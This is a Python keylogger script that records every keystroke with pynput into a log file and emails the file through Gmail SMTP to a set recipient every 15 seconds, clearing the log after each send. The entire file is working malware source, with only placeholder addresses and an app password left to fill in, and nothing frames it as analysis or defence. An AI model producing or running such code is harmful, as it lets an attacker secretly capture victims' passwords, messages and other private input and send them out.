import smtplib
import os
import threading
from pynput import keyboard
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders

# Email Configuration
EMAIL_ADDRESS = "# Replace with your email"  
EMAIL_PASSWORD = "# Replace with your generated app password"  
TO_EMAIL = "# Replace with the recipient's email"  


def send_email():
    try:
        # Create email
        subject = "Keylog Update"
        body = "Here is the latest keylog file."

        msg = MIMEMultipart()
        msg['From'] = EMAIL_ADDRESS
        msg['To'] = TO_EMAIL
        msg['Subject'] = subject

        msg.attach(MIMEText(body, 'plain'))

        # Attach file
        filename = "keylog.txt"
        attachment = open(filename, 'rb')

        part = MIMEBase('application', 'octet-stream')
        part.set_payload(attachment.read())
        encoders.encode_base64(part)
        part.add_header('Content-Disposition', f"attachment; filename={filename}")

        msg.attach(part)

        # Send email
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        server.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
        server.sendmail(EMAIL_ADDRESS, TO_EMAIL, msg.as_string())
        server.quit()

        print("Email sent successfully.")

        # Close and delete the file
        attachment.close()
        os.remove(filename)

        # Create a new log file
        open(filename, 'w').close()

    except Exception as e:
        print(f"Failed to send email: {e}")


def schedule_email():
    send_email()
    threading.Timer(15, schedule_email).start()  # Schedule every 15 seconds


def handle_input():
    while True:
        # This method will run in a separate thread and handle user input.
        user_input = input("Enter something (this will run in a background thread): ")
        print(f"User input: {user_input}")  # You can process input as needed


def keyPressed(key):
    print(f"Key pressed: {key}")
    with open("keylog.txt", 'a') as logkey:
        try:
            # Log space and alphanumeric characters
            if hasattr(key, 'char') and key.char is not None:
                logkey.write(key.char)

            # Log space key
            elif key == keyboard.Key.space:
                logkey.write(' ')

        except Exception as e:
            print(f"Error logging key: {e}")


if __name__ == "__main__":
    schedule_email()  # Start the email scheduling

    # Start the input handler in a separate thread
    input_thread = threading.Thread(target=handle_input)
    input_thread.daemon = True  # This ensures the thread ends when the main program ends
    input_thread.start()

    listener = keyboard.Listener(on_press=keyPressed)
    listener.start()

    # The program will keep running infinitely while key-logging and handling input in the background.
    input_thread.join()
